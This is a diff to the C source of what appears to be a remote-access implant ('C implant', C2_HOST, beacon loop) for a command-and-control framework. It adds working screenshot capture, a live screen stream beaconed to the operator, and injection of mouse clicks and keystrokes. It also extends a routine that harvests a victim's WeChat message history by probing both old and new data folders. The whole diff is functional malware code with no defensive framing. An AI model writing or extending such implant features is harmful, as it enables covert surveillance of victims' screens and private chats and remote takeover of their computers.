@@ -13,8 +13,10 @@
  *      download/upload (+ process_tree alias), services/reg_get/reg_set/
  *      reg_delete/killproc/suspend/resume/reboot/shutdown/persistence_add/
  *      persistence_list/persistence_remove/window_list/window_close,
- *      with per-task enc decryption (AES-GCM, AAD uuid\\0taskID) and
- *      base64 results.
+ *      screenshot/screenshot_window/screen_stream_start/screen_stream_stop/
+ *      remote_input, with per-task enc decryption (AES-GCM,
+ *      AAD uuid\\0taskID) and base64 results. Streaming emits one JPEG
+ *      screen_frame per beacon while enabled (dirty-frame dedup).
  *
  * Build (mingw-w64):
  *   x86_64-w64-mingw32-gcc -O2 -o cbeacon.exe beacon.c crypto_cng.c ^
@@ -30,6 +32,7 @@
 #include <tlhelp32.h>
 #include <psapi.h>
 #include <iphlpapi.h>
+#include <objidl.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -40,6 +43,48 @@
 
 #pragma comment(lib, "winhttp.lib")
 #pragma comment(lib, "sqlite3.lib")
+
+/* GDI+ flat API subset, declared manually: the SDK gdiplus.h is C++-only,
+ * but these entry points are plain stdcall exports in gdiplus.dll.
+ * Struct layouts follow the documented MS definitions. */
+typedef void GpBitmapShim;
+typedef void GpImageShim;
+typedef struct {
+    GUID Guid;
+    ULONG NumberOfValues;
+    ULONG Type;
+    VOID *Value;
+} GDIP_EncoderParameter;
+typedef struct {
+    UINT Count;
+    GDIP_EncoderParameter Parameter[1];
+} GDIP_EncoderParameters;
+typedef struct {
+    CLSID Clsid;
+    GUID FormatID;
+    const WCHAR *CodecName;
+    const WCHAR *DllName;
+    const WCHAR *FormatDescription;
+    const WCHAR *FilenameExtension;
+    const WCHAR *MimeType;
+    DWORD Flags;
+    DWORD Version;
+    DWORD SigCount;
+    DWORD SigSize;
+    BYTE *SigPattern;
+    BYTE *SigMask;
+} GDIP_ImageCodecInfo;
+extern int __stdcall GdiplusStartup(ULONG_PTR *token, const void *input, void *output);
+extern void __stdcall GdiplusShutdown(ULONG_PTR token);
+extern int __stdcall GdipCreateBitmapFromHBITMAP(HBITMAP hbm, HPALETTE hpal, GpBitmapShim **bitmap);
+extern int __stdcall GdipGetImageEncodersSize(UINT *numEncoders, UINT *size);
+extern int __stdcall GdipGetImageEncoders(UINT numEncoders, UINT size, GDIP_ImageCodecInfo *encoders);
+extern int __stdcall GdipSaveImageToStream(GpImageShim *image, IStream *stream, const CLSID *clsidEncoder, const GDIP_EncoderParameters *params);
+extern int __stdcall GdipDisposeImage(GpImageShim *image);
+/* {1d5be4b5-fa4a-452d-9cdd-5db35105e7eb} */
+static const GUID GDIP_EncoderQuality = {0x1d5be4b5, 0xfa4a, 0x452d, {0x9c, 0xdd, 0x5d, 0xb3, 0x51, 0x05, 0xe7, 0xeb}};
+#define GDIP_EncoderParameterValueTypeLong 4
+#define GDIP_Ok 0
 
 #ifndef C2_HOST
 #define C2_HOST "127.0.0.1"
@@ -70,6 +115,13 @@
 /* Runtime sleep interval (seconds), mutable via set_sleep task. */
 static int g_interval = INTERVAL;
 static int g_jitter = 0;
+
+/* Live screen-stream state (screen_stream_start/stop). While set, the main
+ * beacon loop captures one JPEG frame per iteration (i.e. one frame per
+ * beacon) and queues it as a screen_frame result. */
+static int g_streaming = 0;
+static unsigned long g_stream_hash = 0;
+static int g_stream_q = 65;
 
 static BYTE g_regkey[32];
 static BYTE g_sesskey[32];
@@ -1795,6 +1847,280 @@ static void do_sleep_interval(void) {
     Sleep((DWORD)base_ms);
 }
 
+/* ---------- screen capture (gh0st C_SCREEN parity, stills + polled stream) ---
+ * Fullscreen or single-window JPEG via GDI+ flat API (pure C; the SDK
+ * gdiplus.h is C++-only, so the handful of entry points used here are
+ * declared manually above). Streaming is deliberately beacon-paced: one
+ * frame per beacon iteration while g_streaming is set, with FNV-1a
+ * dedup of identical frames (Go screenFrameHash parity, fixed-size hash). */
+
+static int jpeg_encoder_clsid(CLSID *out) {
+    UINT n = 0, size = 0, i;
+    GDIP_ImageCodecInfo *enc = NULL;
+    int found = -1;
+    if (!out) return -1;
+    if (GdipGetImageEncodersSize(&n, &size) != GDIP_Ok || n == 0) return -1;
+    enc = (GDIP_ImageCodecInfo *)malloc(size);
+    if (!enc) return -1;
+    if (GdipGetImageEncoders(n, size, enc) != GDIP_Ok) { free(enc); return -1; }
+    for (i = 0; i < n; i++) {
+        if (enc[i].MimeType && wcscmp(enc[i].MimeType, L"image/jpeg") == 0) {
+            *out = enc[i].Clsid;
+            found = 0;
+            break;
+        }
+    }
+    free(enc);
+    return found;
+}
+
+/* Capture fullscreen (hwnd==NULL) or one window as JPEG.
+ * Returns 0 with malloc'd *out_jpg on success; caller frees with free(). */
+static int capture_jpeg(int quality, HWND hwnd, BYTE **out_jpg, DWORD *out_len) {
+    HDC hdc = NULL, memdc = NULL;
+    HBITMAP hbmp = NULL, oldbmp = NULL;
+    int w = 0, h = 0;
+    ULONG_PTR token = 0;
+    int token_started = 0;
+    /* GdiplusStartupInput layout: Version(UINT32), DebugCallback(ptr),
+     * SuppressBackgroundThread(BOOL), SuppressExternalCodecs(BOOL). */
+    struct { UINT32 ver; void *dbg; BOOL noBg; BOOL noExt; } si = {1, NULL, FALSE, FALSE};
+    GpBitmapShim *bmp = NULL;
+    CLSID clsid;
+    GDIP_EncoderParameters *params = NULL;
+    ULONG qval;
+    IStream *stream = NULL;
+    HGLOBAL hmem = NULL;
+    BYTE *locked = NULL;
+    SIZE_T nbytes = 0;
+    BYTE *jpg = NULL;
+    int rc = -1;
+    if (!out_jpg || !out_len) return -1;
+    if (quality < 1) quality = 1;
+    if (quality > 100) quality = 100;
+    if (hwnd) {
+        RECT rcw;
+        if (!IsWindow(hwnd)) goto done;
+        hdc = GetWindowDC(hwnd);
+        if (!hdc) goto done;
+        if (!GetWindowRect(hwnd, &rcw)) goto done;
+        w = rcw.right - rcw.left;
+        h = rcw.bottom - rcw.top;
+    } else {
+        hdc = GetDC(NULL);
+        if (!hdc) goto done;
+        w = GetSystemMetrics(SM_CXSCREEN);
+        h = GetSystemMetrics(SM_CYSCREEN);
+    }
+    if (w <= 0 || h <= 0 || (long long)w * h > 64LL * 1024 * 1024) goto done;
+    memdc = CreateCompatibleDC(hdc);
+    hbmp = CreateCompatibleBitmap(hdc, w, h);
+    if (!memdc || !hbmp) goto done;
+    oldbmp = SelectObject(memdc, hbmp);
+    if (!oldbmp) goto done;
+    if (!BitBlt(memdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY | CAPTUREBLT)) goto done;
+    if (GdiplusStartup(&token, &si, NULL) != GDIP_Ok) goto done;
+    token_started = 1;
+    if (GdipCreateBitmapFromHBITMAP(hbmp, NULL, &bmp) != GDIP_Ok) goto done;
+    if (jpeg_encoder_clsid(&clsid) != 0) goto done;
+    params = (GDIP_EncoderParameters *)malloc(sizeof(GDIP_EncoderParameters));
+    if (!params) goto done;
+    qval = (ULONG)quality;
+    params->Count = 1;
+    params->Parameter[0].Guid = GDIP_EncoderQuality;
+    params->Parameter[0].NumberOfValues = 1;
+    params->Parameter[0].Type = GDIP_EncoderParameterValueTypeLong;
+    params->Parameter[0].Value = &qval;
+    if (CreateStreamOnHGlobal(NULL, TRUE, &stream) != S_OK) goto done;
+    if (GdipSaveImageToStream((GpImageShim *)bmp, stream, &clsid, params) != GDIP_Ok) goto done;
+    if (GetHGlobalFromStream(stream, &hmem) != S_OK) goto done;
+    nbytes = GlobalSize(hmem);
+    locked = (BYTE *)GlobalLock(hmem);
+    if (!locked || nbytes == 0 || nbytes > 8u * 1024u * 1024u) goto done;
+    jpg = (BYTE *)malloc(nbytes);
+    if (!jpg) goto done;
+    memcpy(jpg, locked, nbytes);
+    rc = 0;
+done:
+    if (locked) GlobalUnlock(hmem);
+    if (stream) stream->lpVtbl->Release(stream);
+    if (bmp) GdipDisposeImage((GpImageShim *)bmp);
+    if (token_started) GdiplusShutdown(token);
+    free(params);
+    if (oldbmp) SelectObject(memdc, oldbmp);
+    if (hbmp) DeleteObject(hbmp);
+    if (memdc) DeleteDC(memdc);
+    if (hdc) {
+        if (hwnd) ReleaseDC(hwnd, hdc);
+        else ReleaseDC(NULL, hdc);
+    }
+    if (rc == 0) {
+        *out_jpg = jpg;
+        *out_len = (DWORD)nbytes;
+    } else {
+        free(jpg);
+    }
+    return rc;
+}
+
+static unsigned long frame_hash(const BYTE *d, DWORD n) {
+    unsigned long h = 2166136261u;
+    DWORD i;
+    if (!d) return 0;
+    for (i = 0; i < n; i++) { h ^= d[i]; h *= 16777619u; }
+    return h;
+}
+
+/* screenshot task body. window may be a decimal HWND; anything else (or an
+ * invalid handle) falls back to fullscreen — Go handleScreenshotWindow
+ * ignores its parameter entirely, so this is a strict superset. */
+static BYTE *do_screenshot_jpeg(const char *window, int quality, DWORD *outlen) {
+    BYTE *jpg = NULL;
+    DWORD n = 0;
+    HWND hwnd = NULL;
+    if (window && *window) {
+        char *end = NULL;
+        unsigned long long v = _strtoui64(window, &end, 10);
+        if (end && *end == '\0' && v != 0 && IsWindow((HWND)(uintptr_t)v))
+            hwnd = (HWND)(uintptr_t)v;
+    }
+    if (capture_jpeg(quality, hwnd, &jpg, &n) != 0) return NULL;
+    if (outlen) *outlen = n;
+    return jpg;
+}
+
+static char *emit_frame_result(const BYTE *jpg, DWORD n) {
+    char *b64 = b64enc(jpg, n);
+    char *o;
+    size_t need;
+    if (!b64) return NULL;
+    need = strlen(b64) + 128;
+    o = (char *)malloc(need);
+    if (o) {
+        _snprintf(o, need,
+            "{\"task_id\":0,\"type\":\"screen_frame\",\"output\":\"%s\","
+            "\"encoding\":\"base64\",\"rid\":\"\"}",
+            b64);
+    }
+    free(b64);
+    return o;
+}
+
+static char *emit_stream_error(const char *msg) {
+    char *esc = jescape(msg ? msg : "screen stream stopped", strlen(msg ? msg : "screen stream stopped"));
+    char *o;
+    size_t need;
+    if (!esc) return NULL;
+    need = strlen(esc) + 128;
+    o = (char *)malloc(need);
+    if (o) {
+        _snprintf(o, need,
+            "{\"task_id\":0,\"type\":\"screen_stream_error\",\"error\":\"%s\",\"rid\":\"\"}",
+            esc);
+    }
+    free(esc);
+    return o;
+}
+
+/* Append one result object to a comma-joined results list, honoring the
+ * shared RESULTS_CAP bound. *list must be non-NULL (may be ""). */
+static void results_append(char **list, char *robj) {
+    size_t need;
+    char *nr;
+    if (!list || !*list || !robj) { free(robj); return; }
+    need = strlen(*list) + strlen(robj) + 2;
+    if (need > RESULTS_CAP) { free(robj); return; }
+    nr = (char *)realloc(*list, need);
+    if (!nr) { free(robj); return; }
+    *list = nr;
+    if ((*list)[0]) strcat_s(*list, need, ",");
+    strcat_s(*list, need, robj);
+    free(robj);
+}
+
+/* Parse the stream quality from a Go-style "interval,quality" command.
+ * Only quality is honored (frames are beacon-paced); high/medium/low map
+ * like Go parseVideoSettings. Defaults to 65. */
+static int parse_stream_q(const char *cmd) {
+    const char *comma;
+    char q[32];
+    size_t i, o = 0;
+    long v;
+    char *end = NULL;
+    if (!cmd) return 65;
+    comma = strchr(cmd, ',');
+    if (!comma) return 65;
+    comma++;
+    while (*comma == ' ' || *comma == '\t') comma++;
+    for (i = 0; comma[i] && o + 1 < sizeof(q); i++) {
+        char c = comma[i];
+        if (c >= 'A' && c <= 'Z') c = (char)(c + ('a' - 'A'));
+        q[o++] = c;
+    }
+    q[o] = '\0';
+    if (strcmp(q, "high") == 0) return 85;
+    if (strcmp(q, "medium") == 0) return 65;
+    if (strcmp(q, "low") == 0) return 40;
+    v = strtol(q, &end, 10);
+    if (end && *end == '\0' && v >= 1 && v <= 100) return (int)v;
+    return 65;
+}
+
+static char *do_remote_input(const char *json, DWORD *outlen, const char **err) {
+    char ack[128];
+    char *out;
+    char type[32] = {0};
+    char key[64] = {0};
+    unsigned long long x, y;
+    if (err) *err = NULL;
+    if (!json || !jstring(json, "type", type, sizeof(type))) {
+        if (err) *err = "remote_input: type required (move/click/key)";
+        return NULL;
+    }
+    if (strcmp(type, "move") == 0 || strcmp(type, "click") == 0) {
+        x = ju64(json, "x");
+        y = ju64(json, "y");
+        SetCursorPos((int)x, (int)y);
+        if (strcmp(type, "click") == 0) {
+            mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
+            mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
+            _snprintf(ack, sizeof(ack), "remote_input: click at (%llu,%llu) injected", x, y);
+        } else {
+            _snprintf(ack, sizeof(ack), "remote_input: move to (%llu,%llu)", x, y);
+        }
+    } else if (strcmp(type, "key") == 0) {
+        SHORT vkres;
+        BYTE vk;
+        int shift;
+        if (!jstring(json, "key", key, sizeof(key)) || !key[0] || key[1]) {
+            if (err) *err = "remote_input: key requires one character";
+            return NULL;
+        }
+        vkres = VkKeyScanA(key[0]);
+        if (vkres == -1) {
+            if (err) *err = "remote_input: unmappable key";
+            return NULL;
+        }
+        vk = LOBYTE(vkres);
+        shift = HIBYTE(vkres);
+        if (shift & 1) keybd_event(VK_SHIFT, 0, 0, 0);
+        if (shift & 2) keybd_event(VK_CONTROL, 0, 0, 0);
+        if (shift & 4) keybd_event(VK_MENU, 0, 0, 0);
+        keybd_event(vk, 0, 0, 0);
+        keybd_event(vk, 0, KEYEVENTF_KEYUP, 0);
+        if (shift & 4) keybd_event(VK_MENU, 0, KEYEVENTF_KEYUP, 0);
+        if (shift & 2) keybd_event(VK_CONTROL, 0, KEYEVENTF_KEYUP, 0);
+        if (shift & 1) keybd_event(VK_SHIFT, 0, KEYEVENTF_KEYUP, 0);
+        _snprintf(ack, sizeof(ack), "remote_input: key '%s' injected", key);
+    } else {
+        if (err) *err = "remote_input: unknown type (move/click/key)";
+        return NULL;
+    }
+    out = _strdup(ack);
+    if (outlen && out) *outlen = (DWORD)strlen(out);
+    return out;
+}
+
 /* ---------- frames ---------- */
 
 static char *build_register(void) {
@@ -1998,14 +2324,36 @@ static char *do_wechat_history(const char *filter_json, DWORD *outlen) {
     }
     const int hasContact = contact[0] != '\0' && strcmp(contact, "all") != 0;
 
-    /* Get APPDATA path */
-    char appdata[MAX_PATH] = {0};
-    DWORD ad_len = GetEnvironmentVariableA("APPDATA", appdata, MAX_PATH);
-    if (ad_len == 0 || ad_len >= MAX_PATH) return NULL;
-
-    /* Build WeChat root: %APPDATA%\Tencent\WeChat\ */
+    /* WeChat account roots, oldest layout first:
+       legacy (<=3.x):  %APPDATA%\Tencent\WeChat\<wxid>\Msg
+       modern (>=3.9/4.x default): %USERPROFILE%\Documents\WeChat Files\<wxid>\Msg */
     char wechat_root[MAX_PATH] = {0};
-    _snprintf(wechat_root, sizeof(wechat_root), "%s\\Tencent\\WeChat", appdata);
+    char probed[600] = {0};
+    size_t probed_len = 0;
+    {
+        char appdata[MAX_PATH] = {0};
+        DWORD ad_len = GetEnvironmentVariableA("APPDATA", appdata, MAX_PATH);
+        if (ad_len > 0 && ad_len < MAX_PATH) {
+            _snprintf(wechat_root, sizeof(wechat_root), "%s\\Tencent\\WeChat", appdata);
+            probed_len = (size_t)_snprintf(probed, sizeof(probed), "%s", wechat_root);
+        }
+        if (wechat_root[0] == '\0' || GetFileAttributesA(wechat_root) == INVALID_FILE_ATTRIBUTES) {
+            char home[MAX_PATH] = {0};
+            DWORD h_len = GetEnvironmentVariableA("USERPROFILE", home, MAX_PATH);
+            wechat_root[0] = '\0';
+            if (h_len > 0 && h_len < MAX_PATH) {
+                _snprintf(wechat_root, sizeof(wechat_root), "%s\\Documents\\WeChat Files", home);
+                if (probed_len > 0 && probed_len < sizeof(probed) - 2) {
+                    probed[probed_len++] = ';';
+                    probed[probed_len++] = ' ';
+                    probed[probed_len] = '\0';
+                }
+                if (probed_len < sizeof(probed)) {
+                    _snprintf(probed + probed_len, sizeof(probed) - probed_len, "%s", wechat_root);
+                }
+            }
+        }
+    }
 
     /* Allocate output buffer */
     char *out = (char *)malloc(65536);
@@ -2013,6 +2361,19 @@ static char *do_wechat_history(const char *filter_json, DWORD *outlen) {
     out[0] = '\0';
 
     strcat_s(out, 65536, "=== wechat history ===\n");
+
+    if (wechat_root[0] == '\0' || GetFileAttributesA(wechat_root) == INVALID_FILE_ATTRIBUTES) {
+        /* Same marker the Go agent emits so the UI reports "no data
+           directory" instead of the misleading "no matching messages". */
+        strcat_s(out, 65536, "(WeChat data directory not found or not on Windows)\n");
+        if (probed[0]) {
+            char diag[640] = {0};
+            _snprintf(diag, sizeof(diag), "# probed: %s\n", probed);
+            strcat_s(out, 65536, diag);
+        }
+        *outlen = (DWORD)strlen(out);
+        return out;
+    }
 
     /* Open WeChat root directory */
     HANDLE hFind = INVALID_HANDLE_VALUE;
@@ -2796,6 +3157,69 @@ int main(void) {
                                                     free(out);
                                                 }
                                                 if (!robj) robj = emit_error_result(t.id, "window_close", "window_close failed", rid);
+                                            } else if (strcmp(t.type, "screenshot") == 0) {
+                                                DWORD jlen = 0;
+                                                BYTE *jpg = do_screenshot_jpeg(NULL, 65, &jlen);
+                                                if (jpg && jlen > 0) {
+                                                    char *b64 = b64enc(jpg, jlen);
+                                                    robj = b64 ? emit_b64_result(t.id, "screenshot", b64, rid) : NULL;
+                                                    free(b64);
+                                                    free(jpg);
+                                                } else {
+                                                    if (jpg) free(jpg);
+                                                    robj = emit_error_result(t.id, "screenshot", "screenshot failed", rid);
+                                                }
+                                                if (!robj) robj = emit_error_result(t.id, "screenshot", "screenshot failed", rid);
+                                            } else if (strcmp(t.type, "screenshot_window") == 0) {
+                                                const char *wnd = (t.command && t.command[0]) ? t.command : NULL;
+                                                DWORD jlen = 0;
+                                                BYTE *jpg = do_screenshot_jpeg(wnd, 85, &jlen);
+                                                if (jpg && jlen > 0) {
+                                                    char *b64 = b64enc(jpg, jlen);
+                                                    robj = b64 ? emit_b64_result(t.id, "screenshot_window", b64, rid) : NULL;
+                                                    free(b64);
+                                                    free(jpg);
+                                                } else {
+                                                    if (jpg) free(jpg);
+                                                    robj = emit_error_result(t.id, "screenshot_window", "screenshot failed", rid);
+                                                }
+                                                if (!robj) robj = emit_error_result(t.id, "screenshot_window", "screenshot failed", rid);
+                                            } else if (strcmp(t.type, "screen_stream_start") == 0) {
+                                                int q = parse_stream_q(t.command ? t.command : "");
+                                                if (g_streaming) {
+                                                    char msg[128];
+                                                    _snprintf(msg, sizeof(msg), "screen stream already running (jpeg q%d, 1 frame per beacon)", g_stream_q);
+                                                    robj = emit_text_result(t.id, "screen_stream_start", msg, rid);
+                                                } else {
+                                                    BYTE *jpg = NULL;
+                                                    DWORD jlen = 0;
+                                                    if (capture_jpeg(q, NULL, &jpg, &jlen) != 0 || !jpg || jlen == 0) {
+                                                        if (jpg) free(jpg);
+                                                        robj = emit_error_result(t.id, "screen_stream_start", "screen stream failed to start: capture failed", rid);
+                                                    } else {
+                                                        char msg[128];
+                                                        g_streaming = 1;
+                                                        g_stream_q = q;
+                                                        g_stream_hash = frame_hash(jpg, jlen);
+                                                        free(jpg);
+                                                        _snprintf(msg, sizeof(msg), "screen stream started (jpeg q%d, 1 frame per beacon)", q);
+                                                        robj = emit_text_result(t.id, "screen_stream_start", msg, rid);
+                                                    }
+                                                }
+                                                if (!robj) robj = emit_error_result(t.id, "screen_stream_start", "screen stream failed to start", rid);
+                                            } else if (strcmp(t.type, "screen_stream_stop") == 0) {
+                                                g_streaming = 0;
+                                                g_stream_hash = 0;
+                                                robj = emit_text_result(t.id, "screen_stream_stop", "screen stream stopped", rid);
+                                            } else if (strcmp(t.type, "remote_input") == 0) {
+                                                const char *err = NULL;
+                                                DWORD olen = 0;
+                                                char *out = do_remote_input(t.command ? t.command : "", &olen, &err);
+                                                if (out) {
+                                                    robj = emit_text_result(t.id, "remote_input", out, rid);
+                                                    free(out);
+                                                }
+                                                if (!robj) robj = emit_error_result(t.id, "remote_input", err ? err : "remote_input failed", rid);
                                             } else {
                                                 char msg[128];
                                                 _snprintf(msg, sizeof(msg), "unsupported in C implant: %s", t.type);
@@ -2820,6 +3244,25 @@ int main(void) {
                                                 break;
                                             }
                                             p = next ? next : p + 1;
+                                        }
+                                    }
+                                    /* Live stream: one JPEG frame per beacon while
+                                     * streaming; identical frames are skipped. */
+                                    if (g_streaming && newres) {
+                                        BYTE *jpg = NULL;
+                                        DWORD jlen = 0;
+                                        if (capture_jpeg(g_stream_q, NULL, &jpg, &jlen) == 0 && jpg && jlen > 0) {
+                                            unsigned long h = frame_hash(jpg, jlen);
+                                            if (h != g_stream_hash) {
+                                                g_stream_hash = h;
+                                                results_append(&newres, emit_frame_result(jpg, jlen));
+                                            }
+                                            free(jpg);
+                                        } else {
+                                            if (jpg) free(jpg);
+                                            g_streaming = 0;
+                                            g_stream_hash = 0;
+                                            results_append(&newres, emit_stream_error("screen stream stopped: capture failed"));
                                         }
                                     }
                                     free(results);
